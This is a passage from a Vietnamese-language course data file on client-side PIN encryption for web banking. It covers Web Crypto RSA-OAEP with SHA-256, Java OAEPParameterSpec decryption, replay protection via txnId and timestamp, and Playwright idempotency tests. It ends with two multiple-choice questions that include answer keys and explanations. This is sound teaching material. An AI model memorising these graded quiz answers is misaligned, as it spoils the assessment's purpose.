      goal: "Thực hành mã hóa PIN trên trình duyệt bằng `Web Crypto API`, giải mã kiểm chứng ngữ cảnh phía Java `Cipher.getInstance(\"RSA/ECB/OAEPWithSHA-256AndMGF1Padding\")` và viết bài test `Playwright` kiểm tra chống trùng khi mạng lỗi.",
      steps: [
        "Bước 1: Sinh cặp khóa RSA-2048 phía Java (`KeyPairGenerator`), xuất Public Key định dạng X.509 SPKI PEM gửi lên cho hàm `encryptTransactionPin` trên trình duyệt chạy thử với mã PIN `'246810'` và `txnId = 'TXN-1001'`.",
        "Bước 2: Gọi hàm mã hóa 2 lần liên tiếp với cùng đầu vào, in kết quả ra Console để xác nhận 2 bản mã `cipherTextBase64` hoàn toàn khác nhau và trong tab Network không hề xuất hiện chuỗi `'246810'`.",
        "Bước 3: Ở phía Java, giải mã bản mã bằng Private Key với cấu hình `OAEPParameterSpec(\"SHA-256\", \"MGF1\", MGF1ParameterSpec.SHA256, PSource.PSpecified.DEFAULT)`, tách chuỗi theo dấu `|` và kiểm chứng `txnId` khớp + `timestamp` còn hiệu lực dưới 60 giây.",
        "Bước 4: Viết 1 kịch bản Playwright dùng `page.route('**/api/v1/transfers', ...)` trả về lỗi `504` ở lần gọi thứ nhất và cho qua ở lần bấm 'Thử lại' thứ hai; assert rằng header `Idempotency-Key` bắt được ở cả 2 lượt là giống hệt nhau."
      ],
      expectedOutput: "Mã PIN được mã hóa an toàn ngay tại trình duyệt và giải mã khớp 100% với Java OAEP SHA-256; bản mã gắn sai `txnId` bị Backend từ chối ngay; kịch bản Playwright tự động vượt qua bài kiểm tra tiêm lỗi mạng `504` xanh toàn trình."
    },
    examTips: [
      "Lưu ý cực kỳ quan trọng khi ghép nối `Web Crypto API` (`RSA-OAEP` SHA-256) với Java JCE chuẩn: Trong Java, chuỗi `" +
        "\"RSA/ECB/OAEPWithSHA-256AndMGF1Padding\"` mặc định dùng `MGF1` với `SHA-1` trong khi trình duyệt dùng `MGF1` với `SHA-256`! Phải truyền tường minh `OAEPParameterSpec` chỉ định `MGF1ParameterSpec.SHA256` bên Java thì mới giải mã khớp nhau!",
      "Khi hội đồng hỏi: 'Mã hóa ở Frontend có chống được hacker mở DevTools trên chính máy của họ để xem PIN của chính họ không?' -> Trả lời rõ: Không cần chống chủ máy tự xem PIN của mình! Mục tiêu thực sự của Client-side Encryption là bảo vệ dữ liệu khỏi bị lộ dạng rõ tại các tầng Proxy/WAF/Gateway/Log trung gian và chống phát lại gói tin.",
      "Trong bộ test Playwright cho ngân hàng, luôn kiểm tra thêm trường hợp 2 Browser Context chuyển tiền cùng lúc để nghiệm thu cả tính năng thông báo `SSE` thời gian thực lẫn khóa chống Race Condition dưới DB."
    ],
    summaryTakeaways: [
      "Sử dụng `Web Crypto API` (`RSA-OAEP` + `SHA-256`) mã hóa mã PIN/mật khẩu ngay tại trình duyệt để dữ liệu nhạy cảm không bao giờ xuất hiện dạng rõ tại CDN, WAF, API Gateway hay hệ thống Log nội bộ.",
      "Luôn nhúng kèm `txnId` và `timestamp` vào bên trong khối dữ liệu trước khi mã hóa để biến mỗi bản mã thành duy nhất và vô hiệu hóa tấn công phát lại (Replay Attack).",
      "Kết hợp khóa liên kết thiết bị `non-extractable` trong `IndexedDB` với phân tích ngữ cảnh thiết bị để kích hoạt xác thực tăng cường (Step-up Biometric/Smart OTP) khi phát hiện giao dịch từ thiết bị lạ.",
      "Xây dựng bộ kiểm thử đầu-cuối tự động bằng `Playwright` (có tiêm lỗi mạng `page.route` và kiểm tra đa trình duyệt) cho các luồng giao dịch trọng yếu nhất trước mỗi đợt triển khai Production."
    ],
    lessonQuestions: [
      {
        question: "Trong kỳ đánh giá tuân thủ PCI-DSS 4.0 cho tính năng Đổi mã PIN thẻ tín dụng trên kênh Web Internet Banking, kiểm toán viên phát hiện dù kết nối từ trình duyệt khách hàng đến F5 Load Balancer của ngân hàng đã dùng TLS 1.3 chuẩn xác, nhưng hệ thống thu thập log lỗi tập trung tại tầng API Gateway nội bộ (nằm phía sau F5) vô tình ghi lại trường JSON `\"newPin\": \"889900\"` ở dạng văn bản rõ khi dịch vụ thẻ phía dưới phản hồi chậm. Giải pháp kiến trúc chuẩn mực nhất là gì?",
        options: [
          "Chỉ cần viết biểu thức chính quy xóa số `889900` khỏi ổ cứng máy chủ log vào cuối mỗi tháng.",
          "Kết hợp hai lớp bảo vệ: (1) Dùng `Web Crypto API` (`RSA-OAEP` SHA-256) trên trình duyệt mã hóa khối `newPin|txnId|timestamp` bằng Public Key của vùng Card Vault/HSM kèm `keyId` để mã PIN không bao giờ tồn tại dạng rõ ở bất kỳ tầng trung gian nào; (2) Cấu hình che mờ (Masking) và tắt ghi body nhạy cảm trên API Gateway.",
          "Yêu cầu khách hàng gửi mã PIN mới qua tin nhắn SMS thông thường thay vì nhập trên giao diện Web.",
          "Bỏ F5 Load Balancer và nối thẳng cáp mạng từ Internet vào máy chủ Database lưu thẻ."
        ],
        answer: 1,
        explanation: "TLS chỉ bảo vệ dữ liệu trên đường truyền bên ngoài cho tới điểm chấm dứt TLS (F5/Ingress). Mã hóa tầng ứng dụng ngay tại trình duyệt bằng `Web Crypto API` đảm bảo chuỗi đi qua F5, WAF, API Gateway và mọi hệ thống giám sát trung gian chỉ là bản mã `cipherTextBase64` vô nghĩa, chỉ có thể giải mã bên trong vùng mạng thẻ cô lập (CDE / HSM), đồng thời vẫn kết hợp kỷ luật không log payload nhạy cảm để phòng thủ chiều sâu.",
        wrongReasons: [
          "Để dữ liệu PIN thẻ nằm dạng rõ trong kho log dù chỉ 1 phút đã vi phạm nghiêm trọng quy tắc cấm lưu trữ dữ liệu xác thực nhạy cảm (SAD) của PCI-DSS.",
          "",
          "Tin nhắn SMS truyền qua hạ tầng viễn thông không mã hóa đầu-cuối và lưu lại trên điện thoại/nhà mạng, cực kỳ mất an toàn cho mã PIN thẻ.",
          "Phơi bày máy chủ vùng thẻ trực tiếp ra Internet không qua tường lửa và cân bằng tải phá vỡ hoàn toàn kiến trúc mạng phân vùng an toàn của ngân hàng."
        ]
      },
      {
        question: "Đội ngũ kỹ sư tích hợp hàm mã hóa `window.crypto.subtle.encrypt({ name: 'RSA-OAEP' }, ...)` với hàm băm `SHA-256` trên trình duyệt TypeScript, còn phía Java Backend viết `Cipher.getInstance(\"RSA/ECB/OAEPWithSHA-256AndMGF1Padding\")` mặc định để giải mã. Khi chạy kiểm thử tích hợp bằng Playwright, 100% giao dịch đều bị Java ném ngoại lệ `BadPaddingException: Decryption error` dù kiểm tra cặp khóa Public/Private khớp nhau hoàn toàn! Nguyên nhân kỹ thuật sâu xa nhất là gì?",
        options: [
          "Do trình duyệt và Java dùng thứ tự bit ngược nhau (Big-Endian vs Little-Endian) cho chuỗi Base64.",
          "Trong đặc tả `Web Crypto API`, thuật toán `RSA-OAEP` với `hash: 'SHA-256'` dùng `SHA-256` cho cả hàm băm chính lẫn hàm sinh mặt nạ `MGF1`; trong khi chuỗi cấu hình mặc định `OAEPWithSHA-256AndMGF1Padding` của SunJCE bên Java lại ngầm dùng `SHA-1` cho `MGF1`! Phải khởi tạo tường minh `OAEPParameterSpec` với `MGF1ParameterSpec.SHA256` bên phía Java.",
          "Do RSA-2048 không thể mã hóa được chuỗi văn bản có chứa ký tự gạch đứng `|`.",
          "Do Playwright tự động sửa đổi nội dung bản mã khi chạy ở chế độ Headless."
        ],
        answer: 1,
        explanation: "Đây là 'cái bẫy kinh điển' thực tế mà hầu như đội tích hợp WebCrypto – Java nào cũng từng vấp phải một lần! Trong Java Standard JCE (`SunJCE`), tên gọi tắt `RSA/ECB/OAEPWithSHA-256AndMGF1Padding` dùng `SHA-256` cho nhãn chính nhưng lại giữ mặc định lịch sử `MGF1ParameterSpec.SHA1` cho bước tạo mặt nạ đệm, lệch với chuẩn `Web Crypto API` (dùng cùng một thuật toán `SHA-256` cho cả hai). Chỉ cần truyền rõ `new OAEPParameterSpec(\"SHA-256\", \"MGF1\", MGF1ParameterSpec.SHA256, PSource.PSpecified.DEFAULT)` vào `cipher.init(...)` bên Java là giải mã khớp 100%.",
        wrongReasons: [
          "Chuẩn mã hóa Base64 (RFC 4648) và biểu diễn số nguyên lớn của RSA tuân theo chuẩn mạng Big-Endian thống nhất trên cả trình duyệt và JVM.",
          "",
          "RSA-OAEP mã hóa trên mảng byte nhị phân bất kỳ (`Uint8Array`), hoàn toàn không phụ thuộc ký tự bên trong là chữ số hay dấu `|`.",
          "Playwright điều khiển nhân trình duyệt thật hoàn toàn trung thực, không bao giờ tự ý can thiệp sửa byte bản mã nếu kịch bản không lập trình can thiệp."
        ]
      }
    ]
  }
});
